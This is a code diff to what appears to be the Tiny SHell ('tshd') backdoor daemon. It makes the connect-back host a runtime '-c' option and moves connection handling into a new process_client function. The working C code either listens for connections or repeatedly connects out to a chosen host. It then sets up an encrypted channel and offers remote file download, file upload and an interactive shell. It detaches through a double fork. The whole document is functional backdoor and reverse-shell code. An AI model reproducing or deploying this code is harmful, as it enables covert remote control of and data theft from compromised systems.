@@ -48,13 +48,14 @@ extern int optind;
 
 /* function declaration */
 
+int process_client( int client );
 int tshd_get_file( int client );
 int tshd_put_file( int client );
 int tshd_runshell( int client );
 
 void usage(char *argv0)
 {
-    fprintf(stderr, "Usage: %s [ -s secret ] [ -p port ]\n", argv0);
+    fprintf(stderr, "Usage: %s [ -c [ connect_back_host ] ] [ -s secret ] [ -p port ]\n", argv0);
     exit(1);
 }
 
@@ -64,25 +65,16 @@ void usage(char *argv0)
 
 int main( int argc, char **argv )
 {
-    int ret, len, pid;
+    int ret, pid;
     socklen_t n;
     int opt;
-
-#ifndef CONNECT_BACK_HOST
 
     int client, server;
     struct sockaddr_in server_addr;
     struct sockaddr_in client_addr;
-
-#else
-
-    int client;
-    struct sockaddr_in client_addr;
     struct hostent *client_host;
 
-#endif
-
-    while ((opt = getopt(argc, argv, "s:p:")) != -1) {
+    while ((opt = getopt(argc, argv, "s:p:c::")) != -1) {
         switch (opt) {
             case 'p':
                 server_port=atoi(optarg); /* We hope ... */
@@ -91,6 +83,13 @@ int main( int argc, char **argv )
             case 's':
                 secret=optarg; /* We hope ... */
                 break;
+			case 'c':
+				if (optarg == NULL) {
+					cb_host = CONNECT_BACK_HOST;
+				} else {
+					cb_host = optarg;
+				}
+				break;
             default: /* '?' */
                 usage(*argv);
                 break;
@@ -127,205 +126,216 @@ int main( int argc, char **argv )
         close( n );
     }
 
-#ifndef CONNECT_BACK_HOST
+	if (cb_host == NULL) {
+    	/* create a socket */
 
-    /* create a socket */
+	    server = socket( AF_INET, SOCK_STREAM, 0 );
 
-    server = socket( AF_INET, SOCK_STREAM, 0 );
+	    if( server < 0 )
+	    {
+	        perror("socket");
+	        return( 3 );
+	    }
 
-    if( server < 0 )
-    {
-        perror("socket");
-        return( 3 );
-    }
+	    /* bind the server on the port the client will connect to */    
 
-    /* bind the server on the port the client will connect to */    
+	    n = 1;
 
-    n = 1;
-
-    ret = setsockopt( server, SOL_SOCKET, SO_REUSEADDR,
+	    ret = setsockopt( server, SOL_SOCKET, SO_REUSEADDR,
                       (void *) &n, sizeof( n ) );
 
-    if( ret < 0 )
-    {
-        perror("setsockopt");
-        return( 4 );
-    }
+	    if( ret < 0 )
+	    {
+	        perror("setsockopt");
+	        return( 4 );
+	    }
 
-    server_addr.sin_family      = AF_INET;
-    server_addr.sin_port        = htons( server_port );
-    server_addr.sin_addr.s_addr = INADDR_ANY;
+	    server_addr.sin_family      = AF_INET;
+	    server_addr.sin_port        = htons( server_port );
+	    server_addr.sin_addr.s_addr = INADDR_ANY;
 
-    ret = bind( server, (struct sockaddr *) &server_addr,
+	    ret = bind( server, (struct sockaddr *) &server_addr,
                 sizeof( server_addr ) );
 
-    if( ret < 0 )
-    {
-        perror("bind");
-        return( 5 );
-    }
+	    if( ret < 0 )
+	    {
+	        perror("bind");
+	        return( 5 );
+	    }
 
-    if( listen( server, 5 ) < 0 )
-    {
-        perror("listen");
-        return( 6 );
-    }
+	    if( listen( server, 5 ) < 0 )
+	    {
+	        perror("listen");
+	        return( 6 );
+	    }
 
-    while( 1 )
-    {
-        /* wait for inboud connections */
+	    while( 1 )
+	    {
+    	    /* wait for inboud connections */
 
-        n = sizeof( client_addr );
+        	n = sizeof( client_addr );
 
-        client = accept( server, (struct sockaddr *)
+	        client = accept( server, (struct sockaddr *)
                          &client_addr, &n );
 
-        if( client < 0 )
-        {
-            perror("accept");
-            return( 7 );
-        }
+    	    if( client < 0 )
+        	{
+            	perror("accept");
+	            return( 7 );
+	        }
 
-#else
+			ret = process_client(client);
 
-    while( 1 )
-    {
-        sleep( CONNECT_BACK_DELAY );
+			if (ret == 1) {
+				continue;
+			}
 
-        /* create a socket */
+	        return( ret );
+		}
+	} else {
+		/* -c specfieid, connect back mode */
 
-        client = socket( AF_INET, SOCK_STREAM, 0 );
+	    while( 1 )
+	    {
+	        sleep( CONNECT_BACK_DELAY );
 
-        if( client < 0 )
-        {
-            continue;
-        }
+	        /* create a socket */
 
-        /* resolve the client hostname */
+	        client = socket( AF_INET, SOCK_STREAM, 0 );
 
-        client_host = gethostbyname( CONNECT_BACK_HOST );
+	        if( client < 0 )
+	        {
+	            continue;
+	        }
 
-        if( client_host == NULL )
-        {
-            continue;
-        }
+	        /* resolve the client hostname */
 
-        memcpy( (void *) &client_addr.sin_addr,
-                (void *) client_host->h_addr,
-                client_host->h_length );
+	        client_host = gethostbyname( cb_host );
 
-        client_addr.sin_family = AF_INET;
-        client_addr.sin_port   = htons( server_port );
+	        if( client_host == NULL )
+	        {
+	            continue;
+	        }
 
-        /* try to connect back to the client */
+	        memcpy( (void *) &client_addr.sin_addr,
+	                (void *) client_host->h_addr,
+	                client_host->h_length );
 
-        ret = connect( client, (struct sockaddr *) &client_addr,
-                       sizeof( client_addr ) );
+	        client_addr.sin_family = AF_INET;
+	        client_addr.sin_port   = htons( server_port );
 
-        if( ret < 0 )
-        {
-            close( client );
-            continue;
-        }
+	        /* try to connect back to the client */
 
-#endif
+	        ret = connect( client, (struct sockaddr *) &client_addr,
+	                       sizeof( client_addr ) );
 
-        /* fork a child to handle the connection */
+	        if( ret < 0 )
+	        {
+	            close( client );
+	            continue;
+	        }
 
-        pid = fork();
+	        ret = process_client(client);
+			if (ret == 1) {
+				continue;
+			}
 
-        if( pid < 0 )
-        {
-            close( client );
-            continue;
-        }
-
-        if( pid != 0 )
-        {
-            waitpid( pid, NULL, 0 );
-            close( client );
-            continue;
-        }
-
-#ifndef CONNECT_BACK_HOST
-
-        /* child doesn't need the server socket */
-
-        close( server );
-
-#endif
-
-        /* the child forks and then exits so that the grand-child's
-         * father becomes init (this to avoid becoming a zombie) */
-
-        pid = fork();
-
-        if( pid < 0 )
-        {
-            return( 8 );
-        }
-
-        if( pid != 0 )
-        {
-            return( 9 );
-        }
-
-        /* setup the packet encryption layer */
-
-        alarm( 3 );
-
-        ret = pel_server_init( client, secret );
-
-        if( ret != PEL_SUCCESS )
-        {
-            shutdown( client, 2 );
-            return( 10 );
-        }
-
-        alarm( 0 );
-
-        /* get the action requested by the client */
-
-        ret = pel_recv_msg( client, message, &len );
-
-        if( ret != PEL_SUCCESS || len != 1 )
-        {
-            shutdown( client, 2 );
-            return( 11 );
-        }
-
-        /* howdy */
-
-        switch( message[0] )
-        {
-            case GET_FILE:
-
-                ret = tshd_get_file( client );
-                break;
-
-            case PUT_FILE:
-
-                ret = tshd_put_file( client );
-                break;
-
-            case RUNSHELL:
-
-                ret = tshd_runshell( client );
-                break;
-
-            default:
-                
-                ret = 12;
-                break;
-        }
-
-        shutdown( client, 2 );
-        return( ret );
-    }
+			return( ret );
+	    }
+	}
 
     /* not reached */
 
     return( 13 );
+}
+
+int process_client(int client) {
+
+	int pid, ret, len;
+
+    /* fork a child to handle the connection */
+
+    pid = fork();
+
+    if( pid < 0 )
+    {
+        close( client );
+        return 1;
+    }
+
+    if( pid != 0 )
+    {
+        waitpid( pid, NULL, 0 );
+        close( client );
+    	return 1;
+    }
+
+    /* the child forks and then exits so that the grand-child's
+     * father becomes init (this to avoid becoming a zombie) */
+
+    pid = fork();
+
+    if( pid < 0 )
+    {
+        return( 8 );
+    }
+
+    if( pid != 0 )
+    {
+    	return( 9 );
+    }
+
+    /* setup the packet encryption layer */
+
+    alarm( 3 );
+
+    ret = pel_server_init( client, secret );
+
+    if( ret != PEL_SUCCESS )
+    {
+		shutdown( client, 2 );
+    	return( 10 );
+    }
+
+    alarm( 0 );
+
+    /* get the action requested by the client */
+
+    ret = pel_recv_msg( client, message, &len );
+
+    if( ret != PEL_SUCCESS || len != 1 )
+    {
+        shutdown( client, 2 );
+        return( 11 );
+    }
+
+    /* howdy */
+
+	switch( message[0] )
+    {
+        case GET_FILE:
+
+            ret = tshd_get_file( client );
+            break;
+
+        case PUT_FILE:
+
+            ret = tshd_put_file( client );
+            break;
+
+        case RUNSHELL:
+
+			ret = tshd_runshell( client );
+			break;
+
+        default:
+                
+        	ret = 12;
+	    	break;
+    }
+
+    shutdown( client, 2 );
+	return( ret );
 }
 
 int tshd_get_file( int client )
